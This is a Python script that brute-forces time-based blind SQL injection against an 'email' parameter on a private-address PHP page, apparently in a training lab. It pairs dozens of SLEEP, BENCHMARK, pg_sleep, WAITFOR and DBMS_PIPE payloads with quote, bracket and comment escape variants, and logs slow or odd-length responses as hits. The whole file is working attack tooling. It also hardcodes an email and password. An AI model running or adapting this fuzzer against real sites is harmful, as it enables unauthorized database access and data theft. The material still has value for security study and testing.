import requests
import time
userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57"
headers={"User-Agent":userAgent}
target = "http://10.102.1.119/regards.php?email="
_email = "stefan@immersivenews.co.uk"
password = "myRandomPassword!"
#target = "http://10.102.1.119/login.php"
payloads = ["' + SLEEP(10)",
            "'sleep(5)",
            "'or sleep(5)",
            "'waitfor delay '0:0:5'",
            "'benchmark(10000000,MD5(1))",
            "'or benchmark(10000000,MD5(1))",
            "'pg_sleep(5)",
            "'or pg_sleep(5)",
            "'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
            "'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
            "'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
            "'SLEEP(5)",
            "'or SLEEP(5)",
            "'waitfor delay '00:00:05'",
            "'benchmark(50000000,MD5(1))",
            "'or benchmark(50000000,MD5(1))",
            "'pg_SLEEP(5)",
            "'or pg_SLEEP(5)",
            "'AnD SLEEP(5)",
            "'&&SLEEP(5)",
            "'AnD SLEEP(5) ANd '1",
            "'&&SLEEP(5)&&'1",
            "'ORDER BY SLEEP(5)",
            "'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
            "'+benchmark(3200,SHA1(1))+'",
            "'+ SLEEP(10) + '",
            "'RANDOMBLOB(500000000/2)",
            "'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
            "'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
            "'RANDOMBLOB(1000000000/2)",
            "'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
            "'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
            "'SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"",
            "'OR SLEEP(10)",
            "'or SLEEP(10)",
            "'AND SLEEP(10)",
            "'and SLEEP(10)",
            "'|| SLEEP(10)",
            "'& SLEEP(10)",
            "'&& SLEEP(10)",
            "'| SLEEP(10)",
            "'+ sleep(10)",
            "'OR sleep(10)",
            "'or sleep(10)",
            "'AND sleep(10)",
            "'and sleep(10)",
            "'|| sleep(10)",
            "'& sleep(10)",
            "'&& sleep(10)",
            "'| sleep(10)",
            "'|| pg_sleep(10)",
            "'WAITFOR DELAY '0:0:10'",
            "'|| [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
            "'|| 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
            "'|| [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
            "'|| 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
            "'| [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
            "'| 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
            "'| [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
            "'| 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
            "'OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
            "'OR 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
            "'OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
            "'OR 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
            "'&& [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
            "'&& 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
            "'&& [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
            "'&& 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
            "'& [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
            "'& 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
            "'& [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
            "'& 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
            "'AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
            "'AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)",
            "'AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
            "'AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
            "'OR LENGTH(DATABASE())>'1",
            ]
escapes = [ "'",
            '"',
            "`",
            "))}}",
            "))}",
            "'))}",
            '"))}',
            "`))}",
            "'))}}",
            '"))}}',
            "`))}}",
            ")}}",
            ")}",
            "')}",
            '")}',
            "`)}",
            "')}}",
            '")}}',
            "`)}}",
            "}}",
            "}",
            "'}",
            '"}',
            "`}",
            "'}}",
            '"}}',
            "`}}",
            "}}))",
            "}})",
            "'}})",
            '"}})',
            "`}})",
            "'}}))",
            '"}}))',
            "`}}))",
            "}))",
            "})",
            "'})",
            '"})',
            "`})",
            "'}))",
            '"}))',
            "`}))",
            "))",
            ")",
            "')",
            '")',
            "`)",
            "'))",
            '"))',
            "`))"]
comments = ["", "--", "#", "/*", "\\", "/", "//", "\\\\"]
spaces = ["", " "]
replaceSpaces = [" ", "%20"]
printed = 0
with open("output.txt", "w") as f:
    for replaceSpace in replaceSpaces:
        for space in spaces:
            time.sleep(1)
            print("space: '{}'".format(space))
            
            for payload in payloads:
                print("payload: {}".format(payload))

                for escape in escapes:
                    for comment in comments:
                        
                        _target = target+payload+comment
                        _target = _target.replace("'", escape+space, 1)
                        _target = _target.replace(" ", replaceSpace)
                        try:

                            r = requests.get(_target)
                            if r.elapsed.total_seconds() > 0.5 or len(r.text) != 1106:
                                f.write(str("FOUND: {} {} {} {}\n".format(r.status_code, r.elapsed.total_seconds(), len(r.text), _target)))

                        except Exception as e:
                            f.write(str("FAILED: {} {} {} {}\nException: {}\n".format( r.status_code, r.elapsed.total_seconds(), len(r.text), _target, e)))

                        if printed == 0:
                            printed = 1
                            print(r.text)
                            print(r.request.url)
                            print(type(r.request.headers))
                            print(r.request.headers)
                            for header, v in r.request.headers.items():
                                print("{}: {}".format(header, v))
                            print(r.request.body)
